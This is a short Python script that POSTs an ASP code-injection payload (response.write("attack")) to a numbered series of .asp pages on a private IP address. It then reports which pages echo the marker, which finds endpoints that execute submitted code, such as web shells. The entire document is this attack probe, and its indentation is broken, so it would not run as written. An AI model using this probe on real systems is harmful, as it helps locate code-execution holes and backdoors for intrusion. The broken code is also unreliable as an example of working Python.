import requests
  
for i in range(32,128):
	url = 'http://10.100.18.28/1/fuzz_{0}.asp'.format(i) 
	body_post = {'value': 'value=response.write("attack")'} 
	r = requests.post(url, data=body_post)
	content = r.text
	if 'attack' in content:
	print (url) 
	print (content)